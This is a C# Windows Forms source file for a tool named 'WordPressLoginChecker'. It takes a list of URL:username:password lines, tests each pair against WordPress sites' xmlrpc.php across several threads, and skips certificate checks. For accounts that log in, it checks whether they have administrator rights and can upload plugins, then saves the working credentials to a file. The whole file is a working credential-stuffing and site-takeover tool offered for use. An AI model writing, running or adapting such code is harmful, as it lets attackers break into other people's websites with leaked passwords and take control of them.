using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace WordPressLoginChecker
{
    public partial class Form1 : Form
    {
        private static readonly HttpClient client;
        private CancellationTokenSource cts;

        static Form1()
        {
            // Create a handler that ignores SSL certificate errors
            HttpClientHandler handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            // Initialize HttpClient with the custom handler
            client = new HttpClient(handler);
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFilePath.Text = openFileDialog.FileName;
            }
        }

        private async void btnCheckLogins_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtFilePath.Text))
            {
                MessageBox.Show("Please select a file first.");
                return;
            }

            if (string.IsNullOrEmpty(txtSaveLocation.Text) || string.IsNullOrEmpty(txtOutputFileName.Text))
            {
                MessageBox.Show("Please select the save location and specify the output file name.");
                return;
            }

            if (numericUpDownThreads.Value < 1)
            {
                MessageBox.Show("Please specify at least 1 thread.");
                return;
            }

            cts = new CancellationTokenSource();
            string[] lines = File.ReadAllLines(txtFilePath.Text);
            int numberOfThreads = (int)numericUpDownThreads.Value;

            List<Task> tasks = new List<Task>();
            int chunkSize = lines.Length / numberOfThreads;

            for (int i = 0; i < numberOfThreads; i++)
            {
                int start = i * chunkSize;
                int end = (i == numberOfThreads - 1) ? lines.Length : start + chunkSize;
                string[] chunk = lines.Skip(start).Take(end - start).ToArray();

                tasks.Add(Task.Run(() => ProcessChunk(chunk, cts.Token)));
            }

            try
            {
                await Task.WhenAll(tasks);
            }
            catch (OperationCanceledException)
            {
                AppendOutput("Operation was canceled.", true);
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (cts != null)
            {
                cts.Cancel();
            }
        }

        private void btnBrowseSaveLocation_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();

            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
            }
        }

        private async Task ProcessChunk(string[] lines, CancellationToken token)
        {
            foreach (string line in lines)
            {
                if (token.IsCancellationRequested)
                    break;

                var match = Regex.Match(line, @"(https?:\/\/[^\s/]+\/(wp-login\.php|wp-admin))\b:([^:]+):([^:]+)");
                if (match.Success)
                {
                    string url = match.Groups[1].Value;
                    string username = match.Groups[3].Value;
                    string password = match.Groups[4].Value;

                    await CheckLogin(url, username, password, token);
                }
            }
        }

        private async Task CheckLogin(string url, string username, string password, CancellationToken token)
        {
            string xmlRpcUrl = Regex.Replace(url, "(wp-login\\.php|wp-admin)$", "xmlrpc.php");
            string xmlRequest = $@"
        <?xml version=""1.0""?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>";

            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");

            try
            {
                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                string responseContent = await response.Content.ReadAsStringAsync();

                // Check if the response content is in XML format
                if (!responseContent.Trim().StartsWith("<?xml"))
                {
                    AppendOutput($"===============================\nInvalid XML response from {url}\n===============================", true);
                    return;
                }

                XDocument xmlResponse = XDocument.Parse(responseContent);

                if (xmlResponse.Descendants("fault").Any())
                {
                    AppendOutput($"===============================\nLogin failed for {url} with user {username}\n===============================", true);
                }
                else
                {
                    bool isAdmin = false;
                    bool canUploadPlugin = false;

                    string matchType = comboBoxMatchType.SelectedItem.ToString();
                    if (matchType == "Valid Admin" || matchType == "Valid Admin + Upload Plugin")
                    {
                        isAdmin = await CheckIfAdmin(xmlRpcUrl, username, password, token);
                        if (matchType == "Valid Admin + Upload Plugin" && isAdmin)
                        {
                            canUploadPlugin = await CheckIfCanUploadPlugin(xmlRpcUrl, username, password, token);
                        }
                    }

                    bool isValid = matchType == "Valid User Only" || (matchType == "Valid Admin" && isAdmin) || (matchType == "Valid Admin + Upload Plugin" && isAdmin && canUploadPlugin);

                    if (isValid)
                    {
                        AppendOutput($"===============================\nLogin successful for {url} with user {username}\n===============================", false);
                        SaveSuccessfulLogin(url, username, password, isAdmin, canUploadPlugin);
                    }
                }
            }
            catch (Exception ex)
            {
                if (!token.IsCancellationRequested)
                {
                    AppendOutput($"===============================\nError checking login for {url}: {ex.Message}\n===============================", true);
                }
            }
        }


        private async Task<bool> CheckIfAdmin(string xmlRpcUrl, string username, string password, CancellationToken token)
        {
            string xmlRequest = $@"
                <?xml version=""1.0""?>
                <methodCall>
                    <methodName>wp.getProfile</methodName>
                    <params>
                        <param><value><string>{username}</string></value></param>
                        <param><value><string>{password}</string></value></param>
                    </params>
                </methodCall>";

            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");

            try
            {
                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                string responseContent = await response.Content.ReadAsStringAsync();

                XDocument xmlResponse = XDocument.Parse(responseContent);

                var roles = xmlResponse.Descendants("member")
                                       .Where(m => m.Element("name").Value == "roles")
                                       .Descendants("value")
                                       .Select(v => v.Value);

                return roles.Contains("administrator");
            }
            catch (Exception)
            {
                return false;
            }
        }

        private async Task<bool> CheckIfCanUploadPlugin(string xmlRpcUrl, string username, string password, CancellationToken token)
        {
            string xmlRequest = $@"
                <?xml version=""1.0""?>
                <methodCall>
                    <methodName>wp.getOptions</methodName>
                    <params>
                        <param><value><string>{username}</string></value></param>
                        <param><value><string>{password}</string></value></param>
                        <param><value><array><data><value><string>upload_plugins</string></value></data></array></value></param>
                    </params>
                </methodCall>";

            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");

            try
            {
                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                string responseContent = await response.Content.ReadAsStringAsync();

                XDocument xmlResponse = XDocument.Parse(responseContent);

                var uploadPluginsOption = xmlResponse.Descendants("value")
                                                     .FirstOrDefault(v => v.Element("name").Value == "upload_plugins");

                return uploadPluginsOption != null && uploadPluginsOption.Value == "1";
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void SaveSuccessfulLogin(string url, string username, string password, bool isAdmin, bool canUploadPlugin)
        {
            string successFilePath = Path.Combine(txtSaveLocation.Text, txtOutputFileName.Text);
            string successEntry = $"{url}:{username}:{password}:IsAdmin={isAdmin}:CanUploadPlugin={canUploadPlugin}\n";
            File.AppendAllText(successFilePath, successEntry);
        }

        private void AppendOutput(string text, bool isError)
        {
            if (isError)
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.Red));
            }
            else
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.LightGreen));
            }

            txtOutput.Invoke((Action)(() =>
            {
                txtOutput.AppendText(text + Environment.NewLine);
                txtOutput.SelectionColor = System.Drawing.Color.Black;

                // Auto-scroll to the bottom
                txtOutput.SelectionStart = txtOutput.Text.Length;
                txtOutput.ScrollToCaret();
            }));
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}
